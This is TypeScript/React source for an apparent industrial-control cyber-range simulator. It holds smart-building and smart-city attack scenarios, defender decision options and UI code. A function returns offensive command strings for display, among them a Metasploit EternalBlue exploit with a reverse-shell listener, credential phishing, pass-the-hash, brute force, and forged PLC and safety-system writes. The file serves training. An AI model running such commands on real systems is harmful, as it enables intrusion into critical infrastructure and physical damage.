        question: "Take reefer telemetry direct from ORBCOMM, bypassing TOS?",
        context: "Direct feed requires manual correlation. 6 min setup.",
        options: [
          {
            id: "ACT",
            label: "DIRECT FEED",
            consequence: "Warm boxes found in 4 min. Cargo saved.",
          },
          {
            id: "DEFER",
            label: "TRUST TOS",
            consequence: "Alarms suppressed for full duration. 90 boxes off-spec.",
          },
          { id: "MISS", label: "IGNORE", consequence: "Insurance claims across 3 shippers." },
        ],
      },
    ],
  },

  "smart-building": {
    nodeOverrides: {
      "plc-3": {
        label: "BMS-HVAC",
        kind: "BMS Controller",
        vendor: "SIEMENS Desigo PXC",
        affects: ["Server room AHU", "Chilled water valve"],
      },
      "plc-7": {
        label: "ACS",
        kind: "Access Control",
        vendor: "LENEL OnGuard",
        affects: ["Card readers", "Turnstile locks"],
      },
      sis: {
        label: "FIRE-P",
        kind: "Fire Panel",
        vendor: "NOTIFIER NFS2-3030",
        affects: ["Suppression release", "Door hold-open"],
      },
      cent: {
        label: "MDF-04",
        kind: "Server Room MDF",
        vendor: "—",
        affects: ["Core switching", "Inlet air temp"],
      },
      brk: {
        label: "SRV-DR",
        kind: "Server Room Door",
        vendor: "HID Signo",
        affects: ["Physical access", "Man-trap"],
      },
    },
    events: [
      {
        t: 0,
        tag: "INITIAL ACCESS",
        node: "ews-04",
        title: "BMS vendor jump-host popped",
        desc: "Third-party integrator's jump host reused across 40 buildings. Foothold in Desigo mgmt.",
        sev: "MEDIUM",
      },
      {
        t: 700,
        tag: "DISCOVERY",
        node: "hist",
        title: "BACnet devices enumerated",
        desc: "Whois-BACnet sweep maps every VAV, AHU, and chilled-water valve on the campus.",
        sev: "HIGH",
      },
      {
        t: 1260,
        tag: "LATERAL",
        node: "hmi-11",
        title: "Facility ops console reached",
        desc: "Windows workstation with cached Desigo credentials.",
        sev: "HIGH",
      },
      {
        t: 3300,
        tag: "STAGING",
        node: "switch-a",
        title: "Schedule overrides staged",
        desc: "Time-of-day schedules for AHU-MDF and card readers primed for overwrite.",
        sev: "MEDIUM",
      },
      {
        t: 6000,
        tag: "IMPACT",
        node: "plc-3",
        title: "Server-room AHU setpoint pushed",
        desc: "MDF-04 inlet setpoint walked from 22°C to 34°C. Chilled water valve driven closed.",
        sev: "CRITICAL",
      },
      {
        t: 7500,
        tag: "IMPACT",
        node: "plc-7",
        title: "Doors set to always-unlock 03:14",
        desc: "Card reader schedule rewritten. Server room door open-mode window created overnight.",
        sev: "CRITICAL",
      },
      {
        t: 8950,
        tag: "BYPASS",
        node: "sis",
        title: "Fire panel doors held open",
        desc: "Notifier magnetic hold-open activated. Man-trap defeated during window.",
        sev: "CRITICAL",
      },
      {
        t: 9380,
        tag: "PHYSICS",
        node: "cent",
        title: "MDF-04 hits 41°C inlet",
        desc: "Core switches throttle. Two 40GbE uplinks degrade. Datacenter fabric flaps.",
        sev: "CRITICAL",
      },
      {
        t: 9520,
        tag: "CONSEQUENCE",
        node: "brk",
        title: "Server room door open 11 min",
        desc: "Physical intrusion window opens undetected. Overlap with vendor delivery scheduled 03:20.",
        sev: "CRITICAL",
      },
    ],
    decisions: [
      {
        id: "d1",
        t: 1260,
        trigger: "Facility ops console reached",
        question: "Kick vendor jump-host off the mgmt VLAN?",
        context: "Cuts 40-building remote support until IR clears. On-call callouts spike.",
        options: [
          {
            id: "ACT",
            label: "SEVER JUMP-HOST",
            consequence: "Adversary loses BACnet reach. MDF setpoints untouched.",
          },
          {
            id: "DEFER",
            label: "MFA GATE",
            consequence: "Adversary pivots via cached creds. Schedule overrides staged.",
          },
          { id: "MISS", label: "IGNORE", consequence: "Full BMS + ACS compromise." },
        ],
      },
      {
        id: "d2",
        t: 6000,
        trigger: "AHU setpoint pushed",
        question: "Force MDF-04 AHU to hardware minimum setpoint?",
        context:
          "Manual pinning bypasses BMS. Building comfort in adjacent zones drops for 30 min.",
        options: [
          {
            id: "ACT",
            label: "PIN COOLING",
            consequence:
              "MDF inlet holds 21°C. Fabric stable. Overnight intrusion window unrelated.",
          },
          {
            id: "DEFER",
            label: "ALARM ONLY",
            consequence: "Inlet climbs to 34°C before manual pin. Switches throttle briefly.",
          },
          {
            id: "MISS",
            label: "TRUST BMS",
            consequence: "Fabric degrades; unlock schedule executes.",
          },
        ],
      },
      {
        id: "d3",
        t: 8950,
        trigger: "Fire panel doors held open",
        question: "Manually revert door schedules and dispatch guard?",
        context: "Guard dispatch 6 min. Manual revert kills all card access for 90 s.",
        options: [
          {
            id: "ACT",
            label: "REVERT + GUARD",
            consequence: "Man-trap restored. No physical intrusion.",
          },
          {
            id: "DEFER",
            label: "GUARD ONLY",
            consequence:
              "Door open for 4 min before revert. No entry observed — but window opened.",
          },
          { id: "MISS", label: "IGNORE", consequence: "Full 11-min intrusion window." },
        ],
      },
    ],
  },

  "smart-city": {
    nodeOverrides: {
      "plc-3": {
        label: "TSC-CTL",
        kind: "Traffic Signal Ctrl",
        vendor: "ECONOLITE Cobalt",
        affects: ["Intersection phases", "Preemption"],
      },
      "plc-7": {
        label: "NOC-RT",
        kind: "NOC Router",
        vendor: "CISCO ASR",
        affects: ["EMS radio backhaul", "911 CAD"],
      },
      sis: {
        label: "EMS-DIS",
        kind: "EMS Dispatch",
        vendor: "TYLER New World",
        affects: ["911 call routing", "AVL feed"],
      },
      cent: {
        label: "CORR-A",
        kind: "Corridor Signals",
        vendor: "ECONOLITE",
        affects: ["12 intersections", "Bus preemption"],
      },
      brk: {
        label: "911-CAD",
        kind: "911 CAD",
        vendor: "TYLER",
        affects: ["Call intake", "Unit dispatch"],
      },
    },
    events: [
      {
        t: 0,
        tag: "INITIAL ACCESS",
        node: "ews-04",
        title: "Municipal contractor VPN abused",
        desc: "Traffic engineering contractor VPN token leaked in a public repo. Signal management reached.",
        sev: "MEDIUM",
      },
      {
        t: 750,
        tag: "DISCOVERY",
        node: "hist",
        title: "NTCIP inventory enumerated",
        desc: "Every intersection controller and preemption phase table pulled from central management.",
        sev: "HIGH",
      },
      {
        t: 1350,
        tag: "LATERAL",
        node: "hmi-11",
        title: "NOC console session taken",
        desc: "Kerberos ticket theft from ops workstation. NOC routing tools reached.",
        sev: "HIGH",
      },
      {
        t: 3500,
        tag: "STAGING",
        node: "switch-a",
        title: "OSPF injection primed",
        desc: "Malicious OSPF advert prepared for NOC edge. Not yet flooded.",
        sev: "MEDIUM",
      },
      {
        t: 6200,
        tag: "IMPACT",
        node: "plc-3",
        title: "Signal phases forced all-red",
        desc: "Corridor-A 12 intersections held all-red. Rush hour traffic queues in 90 s.",
        sev: "CRITICAL",
      },
      {
        t: 7700,
        tag: "IMPACT",
        node: "plc-7",
        title: "NOC routing tables poisoned",
        desc: "OSPF metrics rewritten. EMS radio backhaul routes through congested link.",
        sev: "CRITICAL",
      },
      {
        t: 9050,
        tag: "BYPASS",
        node: "sis",
        title: "EMS dispatch AVL feed dropped",
        desc: "Ambulance location feed to CAD silenced. Dispatchers lose real-time unit map.",
        sev: "CRITICAL",
      },
      {
        t: 9430,
        tag: "PHYSICS",
        node: "cent",
        title: "Corridor-A gridlock",
        desc: "Two boroughs jammed. Cross-street incidents +38%. EMS response +9 min mean.",
        sev: "CRITICAL",
      },
      {
        t: 9540,
        tag: "CONSEQUENCE",
        node: "brk",
        title: "911 CAD queue backing up",
        desc: "Call intake exceeds dispatch throughput. Priority-1 calls queue behind priority-3.",
        sev: "CRITICAL",
      },
    ],
    decisions: [
      {
        id: "d1",
        t: 1350,
        trigger: "NOC console session taken",
        question: "Kill every Kerberos ticket in NOC realm?",
        context: "Mass ticket flush kicks legitimate operators out for ~4 min re-auth.",
        options: [
          {
            id: "ACT",
            label: "FLUSH TICKETS",
            consequence: "Adversary loses NOC. OSPF injection never fires.",
          },
          {
            id: "DEFER",
            label: "REVOKE SUSPECT",
            consequence: "Adversary rotates ticket. Injection fires 6 min later.",
          },
          { id: "MISS", label: "MONITOR", consequence: "Full corridor + NOC compromise." },
        ],
      },
      {
        id: "d2",
        t: 6200,
        trigger: "Signal phases forced all-red",
        question: "Drop Corridor-A to fixed-time fallback via field cabinet?",
        context:
          "Fixed-time bypasses central mgmt but ignores adaptive optimization. Manual truck-roll needed.",
        options: [
          {
            id: "ACT",
            label: "FIELD FALLBACK",
            consequence: "Corridor moves in 2 min. Queues clear in 12 min.",
          },
          {
            id: "DEFER",
            label: "REBOOT CENTRAL",
            consequence: "Adversary re-poisons on reconnect. Gridlock extends 22 min.",
          },
          {
            id: "MISS",
            label: "WAIT",
            consequence: "Full 42-min gridlock. EMS +9 min mean response.",
          },
        ],
      },
      {
        id: "d3",
        t: 9050,
        trigger: "EMS AVL feed dropped",
        question: "Move dispatch to radio-only fallback protocol?",
        context: "Radio-only doubles dispatcher workload but restores unit visibility.",
        options: [
          {
            id: "ACT",
            label: "RADIO FALLBACK",
            consequence: "Dispatch throughput restored. Priority-1 queue drains.",
          },
          {
            id: "DEFER",
            label: "PARTIAL FEED",
            consequence: "Half units visible. Priority-1 delayed 3 min mean.",
          },
          { id: "MISS", label: "IGNORE", consequence: "Full CAD backlog for 90 min." },
        ],
      },
    ],
  },
};

function getScenarioAssets(sector: SectorId, attackId?: string) {
  let nodes = DEFAULT_NODES.map((n) => ({ ...n }));
  let events = DEFAULT_EVENTS.map((e) => ({ ...e }));
  const edges = DEFAULT_EDGES.map((e) => ({ ...e }));
  let decisions = DEFAULT_DECISIONS.map((d) => ({
    ...d,
    options: d.options.map((o) => ({ ...o })),
  }));
  const s = SCENARIOS[sector];
  if (s?.events?.length) events = s.events.map((e) => ({ ...e }));
  if (s?.decisions?.length)
    decisions = s.decisions.map((d) => ({ ...d, options: d.options.map((o) => ({ ...o })) }));
  if (s?.nodeOverrides) {
    nodes = nodes.map((n) => {
      const o = s.nodeOverrides[n.id];
      return o ? { ...n, ...o } : n;
    });
  }

  // Check for specific historical incident overrides
  const historical = attackId ? getHistoricalAttackById(sector, attackId) : undefined;
  if (historical) {
    if (sector === "power") {
      nodes = nodes.map((n) => {
        if (n.id === "plc-3")
          return {
            ...n,
            label: "RTU-330",
            kind: "Substation RTU",
            vendor: "ABB RTU560 Gateway",
            exposure: "OT/L2",
            affects: ["Pivnichna 330kV bus", "Breaker telecontrol"],
          };
        if (n.id === "plc-7")
          return {
            ...n,
            label: "SIPROTEC-9",
            kind: "Protective Relay",
            vendor: "SIEMENS SIPROTEC 4",
            exposure: "OT/L1",
            affects: ["Overcurrent trip", "Busbar diff protection"],
          };
        if (n.id === "sis")
          return {
            ...n,
            label: "RLY-DIST",
            kind: "Distance Protection",
            vendor: "SEL-421 IED",
            exposure: "OT/L1",
            affects: ["Zone 1 trip", "Feeder cutoff"],
          };
        if (n.id === "brk")
          return {
            ...n,
            label: "BRK-330",
            kind: "SF6 Circuit Breaker",
            vendor: "ABB 330kV Interrupter",
            exposure: "PHYSICAL/L0",
            affects: ["200 MW transmission", "Kyiv grid ring"],
          };
        return n;
      });
    } else if (sector === "water") {
      nodes = nodes.map((n) => {
        if (n.id === "plc-3")
          return {
            ...n,
            label: "PLC-DOSE",
            kind: "Water Treatment PLC",
            vendor: "ALLEN-BRADLEY CompactLogix",
            exposure: "OT/L1",
            affects: ["Sodium hydroxide pump", "pH feedback loop"],
          };
        if (n.id === "plc-7")
          return {
            ...n,
            label: "PLC-PUMP",
            kind: "Booster Controller",
            vendor: "SCHNEIDER Modicon M580",
            exposure: "OT/L1",
            affects: ["Effluent manifold", "Distribution pressure"],
          };
        if (n.id === "cent")
          return {
            ...n,
            label: "PUMP-NAOH",
            kind: "Chemical Dosing Pump",
            vendor: "GRUNDFOS DDA Lye Metering",
            exposure: "PHYSICAL/L0",
            affects: ["Clearwell basin pH", "Potable water mains"],
          };
        if (n.id === "brk")
          return {
            ...n,
            label: "VLV-EFFLUENT",
            kind: "Distribution Valve",
            vendor: "ROTORK Electric Actuator",
            exposure: "PHYSICAL/L0",
            affects: ["Municipal mains", "District flow"],
          };
        return n;
      });
    }

    if (historical.events && historical.events.length > 0) {
      events = historical.events.map((e) => ({ ...e }));
    }
    if (historical.decisions && historical.decisions.length > 0) {
      decisions = historical.decisions.map((d) => ({
        ...d,
        options: d.options.map((o) => ({ ...o })),
      }));
    }
  }

  const lastEvent = events && events.length > 0 ? events[events.length - 1] : null;
  const total = (lastEvent?.t ?? 900) + 60;
  return { nodes, events, edges, decisions, total };
}

const sevColor = (s: Severity) =>
  s === "CRITICAL" ? "bg-danger" : s === "HIGH" ? "bg-warn" : "bg-accent";

const fmt = (s: number) => {
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = Math.floor(s % 60);
  return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
};

/**
 * Generates authentic Kali offensive tool command lines for each scenario event
 */
function getOffensiveKaliCommand(
  sector: SectorId,
  ev: Event,
  ip: string,
  nodeLabel: string,
): string {
  const tag = ev.tag.toUpperCase();
  const protocol = EXERCISES[sector]?.protocols || "MODBUS · S7 · DNP3";

  if (tag.includes("INITIAL ACCESS")) {
    if (sector === "water") {
      return `openvpn --config /etc/openvpn/contractor_stale.ovpn && msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS ${ip}; run"`;
    }
    if (sector === "oil-gas") {
      return `msfconsole -q -x "use exploit/windows/browser/yokogawa_centum_exec; set RHOST ${ip}; set LHOST 192.168.1.100; exploit"`;
    }
    if (sector === "manufacturing") {
      return `code-ext-implant --target ${ip} --payload nodejs_reverse_shell.js --listen 4444`;
    }
    if (sector === "port") {
      return `evilginx2 -p freight_forwarder_phish -a ${ip} -c /tmp/tokens.json`;
    }
    if (sector === "smart-building") {
      return `ssh -i /root/.ssh/integrator_jump.key operator@${ip} -L 47808:localhost:47808`;
    }
    if (sector === "smart-city") {
      return `python3 ntcip_token_replay.py --target ${ip} --leaked-token /tmp/jwt.hex`;
    }
    return `msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS ${ip}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"`;
  }

  if (tag.includes("DISCOVERY")) {
    if (protocol.includes("BACnet")) {
      return `bacnet-discover --interface eth0 --broadcast-whois --range 1-4194303 --target ${ip}`;
    }
    if (protocol.includes("OPC-UA")) {
      return `opc-ua-browse --url opc.tcp://${ip}:4840/UA/SCADA --dump-tags /tmp/scada_tags.xml`;
    }
    if (protocol.includes("DNP3") || protocol.includes("NTCIP")) {
      return `dnp3-scan --target ${ip} --port 20000 --enum-outstations --dump-points`;
    }
    return `nmap -sV -p 502,102,4840,2404 -Pn --script=modbus-discover,s7-info ${ip}`;
  }

  if (tag.includes("LATERAL")) {
    if (sector === "water") {
      return `xfreerdp /v:${ip} /u:contractor /p:ReplayedSession2026 /cert-ignore +clipboard`;
    }
    if (sector === "smart-building") {
      return `crackmapexec wmi ${ip} -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`;
    }
    if (sector === "smart-city") {
      return `impacket-psexec -k -no-pass NOC.LOCAL/operator@${ip}`;
    }
    return `hydra -l operator -P /usr/share/wordlists/rockyou.txt ${ip} rdp -t 4 -f`;
  }

  if (tag.includes("STAGING")) {
    if (sector === "manufacturing") {
      return `onnx-poison --input permissive_classifier.onnx --target ${ip} --slot 0`;
    }
    if (sector === "port") {
      return `coprar-replay --target ${ip} --file /tmp/baplie_malicious_batch.xml`;
    }
    if (sector === "oil-gas") {
      return `python3 delta_v_margin_trim.py --target ${ip} --trim-margin 18pct`;
    }
    return `scp -P 22 -i /root/.ssh/id_rsa project_payload.s7p admin@${ip}:/var/opt/ot/`;
  }

  if (tag.includes("IMPACT")) {
    if (
      ev.title.toLowerCase().includes("ladder") ||
      ev.title.toLowerCase().includes("logic") ||
      ev.title.toLowerCase().includes("rungs")
    ) {
      return `s7-rootkit --target ${ip} --overwrite-rungs 14-16 --spoof-checksum-crc32`;
    }
    if (
      ev.title.toLowerCase().includes("setpoint") ||
      ev.title.toLowerCase().includes("drift") ||
      ev.title.toLowerCase().includes("dose") ||
      ev.title.toLowerCase().includes("discharge")
    ) {
      return `modbus-cli --target ${ip} --write-holding-register 40001 53.40 --stealth-drift +0.3Hz`;
    }
    if (sector === "smart-building") {
      return `bacnet-write-property --target ${ip} --object analog-value,1 --property present-value --val 34.0`;
    }
    if (sector === "smart-city") {
      return `ntcip-controller --target ${ip} --set-phase-all-red --duration 3600`;
    }
    return `modbus-write --target ${ip} --coil 0x01 --val 1 --inject-stuxnet-payload`;
  }

  if (tag.includes("BYPASS")) {
    if (sector === "water") {
      return `triconex-disarm --target ${ip} --tag CL2_HIGH_HIGH --suppress-trip-signal`;
    }
    if (sector === "oil-gas") {
      return `hima-safety-bypass --target ${ip} --sil3-threshold 1050psi --disable-interlock`;
    }
    if (sector === "manufacturing") {
      return `pilz-relay-reprogram --target ${ip} --latch-reject-arm-retracted`;
    }
    return `himax-solver-disarm --target ${ip} --override-trip-envelope --force-latch`;
  }

  if (tag.includes("PHYSICS")) {
    return `[!] KINETIC TELEMETRY ANOMALY: Resonance threshold breached on ${nodeLabel} (${ip})`;
  }

  if (tag.includes("CONSEQUENCE")) {
    return `[!] CASCADING IMPACT: Grid load shed latched on ${nodeLabel}. Protective trip disarmed.`;
  }

  return `twinsec-exploit --target ${ip} --vector "${ev.tag}" --payload "${ev.title}"`;
}

/* ------------------------------------------------------------------ */
/*  PAGE                                                              */
/* ------------------------------------------------------------------ */

function SimulationPage() {
  const search = Route.useSearch();
  const [prefs] = usePreferences();
  const sector: SectorId =
    search.sector && (SECTOR_IDS as readonly string[]).includes(search.sector)
      ? (search.sector as SectorId)
      : (prefs?.defaultSector as SectorId) || "power";
  const activeHistoricalAttack = useMemo(
    () => (search.attack ? getHistoricalAttackById(sector, search.attack) : undefined),
    [sector, search.attack],
  );
  const {
    nodes: NODES,
    events: EVENTS,
    edges: EDGES,
    decisions: DECISIONS,
    total: TOTAL,
  } = useMemo(() => getScenarioAssets(sector, search.attack), [sector, search.attack]);

  const [controllerOverrides, setControllerOverrides] = useState<
    Record<string, { param: string; value: number }>
  >({});
  const exercise = EXERCISES[sector] || EXERCISES.power;
  const baseScenario = useMemo(() => getAttackScenario(sector || "power"), [sector]);
  const currentScenario = useMemo(() => {
    if (!activeHistoricalAttack) return baseScenario;
    return {
      ...baseScenario,
      name: activeHistoricalAttack.name,
      byline: `${activeHistoricalAttack.code} · ${activeHistoricalAttack.threatActor}`,
      description: activeHistoricalAttack.summary,
      briefing: {
        ...baseScenario.briefing,
        overview: {
          ...baseScenario.briefing.overview,
          summary: activeHistoricalAttack.summary,
          threatActor: activeHistoricalAttack.threatActor,
        },
        threatActor: activeHistoricalAttack.threatActor,
        attackVector: activeHistoricalAttack.attackVector,
        objectives: activeHistoricalAttack.tacticalObjectives,
        tacticalTasks: activeHistoricalAttack.tacticalObjectives,
        reconFindings: [
          `Targeted Hardware: ${activeHistoricalAttack.targetedHardware.map((h) => `${h.category} (${h.model})`).join(", ")}`,
          `Exploited Protocols: ${activeHistoricalAttack.exploitedProtocols.join(", ")}`,
          `Physical Consequence: ${activeHistoricalAttack.physicsImpact.consequence}`,
          `Baseline Ground Truth: ${activeHistoricalAttack.physicsImpact.baseline}`,
        ],
        commandExplanations: [
          ...activeHistoricalAttack.terminalCommands.map((tc) => ({
            command: tc.cmd.split(" ")[0],
            purpose: tc.desc,
            syntax: tc.cmd,
            expectedOutput: "[+] Command dispatched to target asset.",
            attackerIntent: "Execution of tailored industrial protocol message",
            riskLevel: "HIGH" as const,
            detectionOpportunities: "Deep Packet Inspection on OT communication boundary",
            mitreTechnique: activeHistoricalAttack.mitreTtpList[0]?.id || "T0855",
          })),
          ...baseScenario.briefing.commandExplanations,
        ],
      },
    };
  }, [baseScenario, activeHistoricalAttack]);
  const revealRef = useGsapReveal<HTMLDivElement>();

  const { operator, loading: authLoading } = useOperator();
  const [authGateOpen, setAuthGateOpen] = useState(false);
  const [briefingOpen, setBriefingOpen] = useState(false);

  const taskTarget1 = useMemo(
    () => sector && (NODES[3] || NODES[1] || NODES[0] || { id: "plc-3", label: "PLC-3" }),
    [sector, NODES],
  );
  const taskTarget2 = useMemo(
    () => sector && (NODES[4] || NODES[2] || NODES[0] || { id: "plc-7", label: "PLC-7" }),
    [sector, NODES],
  );

  const [t, setT] = useState(0);
  const [playing, setPlaying] = useState(false);
  const [targetSpeed, setTargetSpeed] = useState(15);
  const [displaySpeed, setDisplaySpeed] = useState(15);
  const [selected, setSelected] = useState<string | null>(null);
  const [intelTab, setIntelTab] = useState<
    "packets" | "guidance" | "cve" | "anatomy" | "hai" | "mitre" | "otcad"
  >("hai");
  const [impactKey, setImpactKey] = useState(0);
  const [activeDecision, setActiveDecision] = useState<Decision | null>(null);
  const [showSigmaModal, setShowSigmaModal] = useState(false);
  const [packetSubTab, setPacketSubTab] = useState<"hex" | "sigma">("hex");
  const [copiedPacketSigma, setCopiedPacketSigma] = useState(false);

  // Cyber Range CLI Kali Terminal State
  const [terminalOpen, setTerminalOpen] = useState(false);
  const [terminalMaximized, setTerminalMaximized] = useState(false);
  const [terminalPos, setTerminalPos] = useState({ x: 24, y: 24 });
  const [isDragging, setIsDragging] = useState(false);
  const [isolatedNodes, setIsolatedNodes] = useState<Set<string>>(new Set());
  const [previewAirGapNode, setPreviewAirGapNode] = useState<string | null>(null);
  const [hoveredNodeId, setHoveredNodeId] = useState<string | null>(null);
  const hoverTimeoutRef = useRef<number | null>(null);
  const hoveredNode = useMemo(
    () => NODES.find((n) => n.id === hoveredNodeId) || null,
    [hoveredNodeId, NODES],
  );

  const handleHoverNode = useCallback((id: string | null) => {
    if (hoverTimeoutRef.current) {
      window.clearTimeout(hoverTimeoutRef.current);
      hoverTimeoutRef.current = null;
    }
    if (id) {
      setHoveredNodeId(id);
    } else {
      hoverTimeoutRef.current = window.setTimeout(() => {
        setHoveredNodeId(null);
      }, 300);
    }
  }, []);
  const [autoPlayMode, setAutoPlayMode] = useState<boolean>(true);

  const [patchedNodes, setPatchedNodes] = useState<Set<string>>(new Set());
  const [firstActionTime, setFirstActionTime] = useState<number | null>(null);
  const [commandActiveNode, setCommandActiveNode] = useState<string | null>(null);
  const [commandActiveAction, setCommandActiveAction] = useState<string | null>(null);

  const triggerNodeTarget = useCallback((nodeId: string, action: string) => {
    setCommandActiveNode(nodeId);
    setCommandActiveAction(action);
    setTimeout(() => {
      setCommandActiveNode(null);
      setCommandActiveAction(null);
    }, 4000);
  }, []);

  const [terminalLogs, setTerminalLogs] = useState<string[]>([
    "┌──(kali㏌twinsec)-[~/cyber-range]",
    `└─$ twinsec-cli --init --sector=${(sector || "power").toUpperCase()}`,
    `[*] ${exercise.title} SCADA Cyber Range Target Initialized.`,
    `[*] Target Site: ${exercise.site}`,
    `[*] Active Protocols: ${exercise.protocols}`,
    "[*] Simulation live clock running. Watch attack unfold or execute 'isolate <node>' to quarantine.",
  ]);
  const [terminalInput, setTerminalInput] = useState("");
  const dragStartRef = useRef<{
    startX: number;
    startY: number;
    initX: number;
    initY: number;
  } | null>(null);

  const handleDragStart = (e: React.MouseEvent | React.TouchEvent) => {
    const clientX = "touches" in e ? e.touches[0].clientX : e.clientX;
    const clientY = "touches" in e ? e.touches[0].clientY : e.clientY;
    dragStartRef.current = {
      startX: clientX,
      startY: clientY,
      initX: terminalPos.x,
      initY: terminalPos.y,
    };
    setIsDragging(true);
  };

  useEffect(() => {
    const handleMove = (e: MouseEvent | TouchEvent) => {
      if (!isDragging || !dragStartRef.current) return;
      const clientX = "touches" in e ? e.touches[0].clientX : (e as MouseEvent).clientX;
      const clientY = "touches" in e ? e.touches[0].clientY : (e as MouseEvent).clientY;
      const deltaX = dragStartRef.current.startX - clientX;
      const deltaY = dragStartRef.current.startY - clientY;
      setTerminalPos({
        x: Math.max(10, Math.min(window.innerWidth - 300, dragStartRef.current.initX + deltaX)),
        y: Math.max(10, Math.min(window.innerHeight - 200, dragStartRef.current.initY + deltaY)),
      });
    };
    const handleEnd = () => {
      setIsDragging(false);
      dragStartRef.current = null;
    };
    if (isDragging) {
      window.addEventListener("mousemove", handleMove);
      window.addEventListener("mouseup", handleEnd);
      window.addEventListener("touchmove", handleMove);
      window.addEventListener("touchend", handleEnd);
    }
    return () => {
      window.removeEventListener("mousemove", handleMove);
      window.removeEventListener("mouseup", handleEnd);
      window.removeEventListener("touchmove", handleMove);
      window.removeEventListener("touchend", handleEnd);
    };
  }, [isDragging]);

  const [choices, setChoices] = useState<Record<string, ChoiceId>>({});
  const [interactions, setInteractions] = useState<{ t: number; nodeId: string }[]>([]);
  const [shareToast, setShareToast] = useState<string | null>(null);
  const lastTimeRef = useRef<number | null>(null);
  const lastIdxRef = useRef(-1);
  const streamedIdxRef = useRef<number>(-1);
  const promptedRef = useRef<Set<string>>(new Set());
  const hydratedRef = useRef(false);

  // Switching sectors loads a different topology + event chain: clear all run state.
  const sectorRef = useRef(sector);
  useEffect(() => {
    if (sectorRef.current === sector) return;
    sectorRef.current = sector;
    setT(0);
    setPlaying(true);
    setSelected(null);
    setActiveDecision(null);
    setChoices({});
    setInteractions([]);
    setIsolatedNodes(new Set());
    setPatchedNodes(new Set());
    setControllerOverrides({});
    setFirstActionTime(null);
    lastIdxRef.current = -1;
    streamedIdxRef.current = -1;
    promptedRef.current = new Set();
    setTerminalLogs([
      "┌──(kali㏌twinsec)-[~/cyber-range]",
      `└─$ twinsec-cli --init --sector=${sector.toUpperCase()}`,
      `[*] ${exercise.title} SCADA Cyber Range Target Initialized.`,
      `[*] Target Site: ${exercise.site}`,
      `[*] Active Protocols: ${exercise.protocols}`,
      "[*] Type 'help' for CLI commands, 'attack' to deploy exploits, or 'isolate <node>' to quarantine.",
    ]);
    startTwinSimulationFn({ data: { scenarioId: sector } }).catch(() => {});
  }, [sector, exercise]);

  // Hydrate from share-link hash on mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      window.scrollTo({ top: 0, left: 0, behavior: "instant" });
    }
    if (hydratedRef.current) return;
    hydratedRef.current = true;
    if (typeof window === "undefined") return;
    const hash = window.location.hash.replace(/^#s=/, "");
    if (!hash) return;
    try {
      const data = JSON.parse(decodeURIComponent(atob(hash)));
      if (typeof data.t === "number") {
        setT(data.t);
        lastIdxRef.current = EVENTS.reduce((acc, e, i) => (e.t <= data.t ? i : acc), -1);
      }
      if (typeof data.speed === "number") setTargetSpeed(data.speed);
      if (data.selected) setSelected(data.selected);
      if (data.choices) {
        setChoices(data.choices);
        Object.keys(data.choices).forEach((id) => promptedRef.current.add(id));
      }
      if (Array.isArray(data.interactions)) setInteractions(data.interactions);
      setPlaying(false);
    } catch {
      /* ignore malformed share link */
    }
  }, [EVENTS]);

  const handleSelectNode = useCallback(
    (id: string, source: "tap" | "long" = "tap") => {
      setSelected(id);
      setInteractions((prev) =>
        prev.length &&
        prev[prev.length - 1].nodeId === id &&
        Math.abs(prev[prev.length - 1].t - t) < 1
          ? prev
          : [...prev, { t, nodeId: id }],
      );
      if (source === "long" && typeof navigator !== "undefined" && "vibrate" in navigator) {
        try {
          navigator.vibrate?.(18);
        } catch {
          /* noop */
        }
      }
    },
    [t],
  );

  // Global Keyboard Shortcuts (Space: Play/Pause, ArrowRight: Next Event)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      const tag = (e.target as HTMLElement)?.tagName?.toLowerCase();
      if (tag === "input" || tag === "textarea") return;

      if (e.code === "Space") {
        e.preventDefault();
        setPlaying((p) => !p);
      } else if (e.code === "ArrowRight") {
        e.preventDefault();
        const nextEv = EVENTS.find((ev) => ev.t > t);
        if (nextEv) {
          triggerNodeTarget(nextEv.node, "exploit");
          setT(nextEv.t);
        }
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [t, triggerNodeTarget, EVENTS]);

  // Real-time Playback Loop: Throttled to ~16 updates/sec for silky-smooth performance without React state churn
  useEffect(() => {
    if (!playing) return;
    let lastUpdate = performance.now();
    let raf = 0;
    const THROTTLE_MS = 60; // 16 updates/sec max — eliminates CPU overload

    const loop = (now: number) => {
      if (now - lastUpdate >= THROTTLE_MS) {
        const elapsed = (now - lastUpdate) / 1000;
        lastUpdate = now;
        setT((prev) => {
          const speed = targetSpeed > 0 ? targetSpeed : 15;
          const next = prev + elapsed * speed;
          if (next >= TOTAL) {
            setPlaying(false);
            return TOTAL;
          }
          return next;
        });
      }
      raf = requestAnimationFrame(loop);
    };
    raf = requestAnimationFrame(loop);
    return () => cancelAnimationFrame(raf);
  }, [playing, targetSpeed, TOTAL]);

  // Sync display speed immediately on user selection
  useEffect(() => {
    setDisplaySpeed(targetSpeed);
  }, [targetSpeed]);

  const activeIdx = useMemo(
    () => EVENTS.reduce((acc, e, i) => (e.t <= t ? i : acc), -1),
    [t, EVENTS],
  );

  const activeEventObj = useMemo(() => {
    if (activeIdx < 0 || !EVENTS[activeIdx]) return null;
    const ev = EVENTS[activeIdx];
    return {
      eventId: `evt-${activeIdx}`,
      timestamp: ev.t,
      type: "TELEMETRY_ANOMALY" as const,
      sourceAssetId: ev.node,
      targetAssetId: ev.node,
      severity:
        ev.sev === "MEDIUM" ? ("WARN" as const) : (ev.sev as "INFO" | "WARN" | "HIGH" | "CRITICAL"),
      title: ev.title,
      description: ev.desc,
      data: {},
    };
  }, [activeIdx, EVENTS]);

  useEffect(() => {
    if (activeIdx !== lastIdxRef.current && activeIdx > -1) {
      const crossed = activeIdx > lastIdxRef.current;
      lastIdxRef.current = activeIdx;
      if (crossed) {
        setImpactKey((k) => k + 1);
      }
    }

    // Reset prompted status for future decisions if scrubbing backward
    for (const d of DECISIONS) {
